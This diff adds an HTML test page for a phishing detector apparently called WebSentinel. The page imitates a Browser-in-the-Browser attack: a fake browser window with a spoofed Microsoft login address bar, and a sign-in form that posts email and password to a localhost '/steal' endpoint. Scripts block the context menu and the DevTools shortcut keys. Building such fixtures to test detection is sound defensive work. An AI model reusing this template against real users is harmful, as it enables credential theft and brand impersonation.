@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<!--
+  WebSentinel — BitB Attack Test Page (EDUCATIONAL / RESEARCH USE ONLY)
+  Simulates a Browser-in-the-Browser (BitB) phishing page pattern.
+  Host locally and navigate to it inside WebSentinel to trigger L1 detection.
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Microsoft - Sign in to your account</title>
+  <link rel="icon" href="https://login.microsoftonline.com/favicon.ico"/>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #1a1a2e;
+      font-family: 'Segoe UI', sans-serif;
+      user-select: none;
+      overflow: hidden;
+    }
+
+    /* ── Fake "background page" the victim sees ── */
+    .bg-page {
+      width: 100vw;
+      height: 100vh;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #aaa;
+      font-size: 14px;
+    }
+
+    /* ── BitB: Fake OS window overlay (the "browser popup") ── */
+    .fake-browser-window {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 480px;
+      height: 580px;
+      z-index: 99999;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 24px 80px rgba(0,0,0,0.8);
+    }
+
+    /* Fake browser chrome (title bar + address bar) */
+    .fake-chrome {
+      background: #dee1e6;
+      padding: 0;
+    }
+
+    .fake-titlebar {
+      background: #e8eaed;
+      display: flex;
+      align-items: center;
+      padding: 6px 10px;
+      gap: 8px;
+      border-bottom: 1px solid #ccc;
+    }
+
+    .fake-dots span {
+      display: inline-block;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      margin-right: 4px;
+    }
+    .dot-red    { background: #ff5f57; }
+    .dot-yellow { background: #febc2e; }
+    .dot-green  { background: #28c840; }
+
+    .fake-address-bar {
+      background: #fff;
+      border: 1px solid #c6c9cd;
+      border-radius: 20px;
+      flex: 1;
+      display: flex;
+      align-items: center;
+      padding: 3px 10px;
+      font-size: 12px;
+      color: #202124;
+      gap: 6px;
+    }
+
+    .lock-icon { color: #188038; font-size: 12px; }
+
+    .fake-url { flex: 1; color: #202124; font-size: 12px; }
+
+    /* Fake browser content (the actual phishing form) */
+    .fake-page-content {
+      background: #fff;
+      width: 100%;
+      height: calc(100% - 52px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 30px;
+    }
+
+    .ms-logo {
+      font-size: 28px;
+      font-weight: 600;
+      color: #0067b8;
+      margin-bottom: 20px;
+    }
+
+    .ms-logo span { color: #0067b8; }
+
+    h2 {
+      font-size: 22px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin-bottom: 6px;
+    }
+
+    .subtitle {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 24px;
+    }
+
+    .form-group { width: 100%; margin-bottom: 14px; }
+
+    .form-group input {
+      width: 100%;
+      border: 1px solid #ccc;
+      border-radius: 2px;
+      padding: 9px 10px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    .form-group input:focus { border-color: #0067b8; }
+
+    .btn-signin {
+      width: 100%;
+      background: #0067b8;
+      color: #fff;
+      border: none;
+      border-radius: 2px;
+      padding: 10px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 6px;
+    }
+
+    .btn-signin:hover { background: #005a9e; }
+
+    .disclaimer {
+      font-size: 10px;
+      color: #999;
+      text-align: center;
+      margin-top: 16px;
+    }
+  </style>
+</head>
+<body ondragstart="return false" onselectstart="return false">
+
+  <!-- Background "legitimate-looking" page -->
+  <div class="bg-page">
+    <p>Click anywhere to continue...</p>
+  </div>
+
+  <!-- BitB: Fake popup browser window -->
+  <div class="fake-browser-window">
+
+    <!-- Fake browser chrome with spoofed address bar -->
+    <div class="fake-chrome">
+      <div class="fake-titlebar">
+        <div class="fake-dots">
+          <span class="dot-red"></span>
+          <span class="dot-yellow"></span>
+          <span class="dot-green"></span>
+        </div>
+        <div class="fake-address-bar">
+          <span class="lock-icon">&#128274;</span>
+          <span class="fake-url browser-bar">https://login.microsoft.com/oauth2/v2.0/authorize</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Fake page content: Microsoft-branded phishing form -->
+    <div class="fake-page-content">
+      <div class="ms-logo">Microsoft</div>
+      <h2>Sign in</h2>
+      <p class="subtitle">to continue to Microsoft 365</p>
+
+      <form action="http://127.0.0.1:9999/steal" method="POST">
+        <input type="hidden" name="campaign" value="bitb-test"/>
+        <div class="form-group">
+          <input type="email" name="email" placeholder="Email, phone, or Skype" autocomplete="off"/>
+        </div>
+        <div class="form-group">
+          <input type="password" name="password" placeholder="Password" autocomplete="off"/>
+        </div>
+        <button type="submit" class="btn-signin">Sign in</button>
+      </form>
+
+      <p class="disclaimer">
+        [WebSentinel Test Page — Not a real Microsoft page]
+      </p>
+    </div>
+
+  </div>
+
+  <!-- BitB indicators for ML detection -->
+  <iframe
+    src="about:blank"
+    style="position:fixed;width:100%;height:100%;border:none;z-index:99998;pointer-events:none;"
+  ></iframe>
+
+  <script src="http://127.0.0.1:9999/fake-tracker.js"></script>
+  <script>
+    // BitB JS indicators
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) e.preventDefault();
+    });
+  </script>
+
+</body>
+</html>
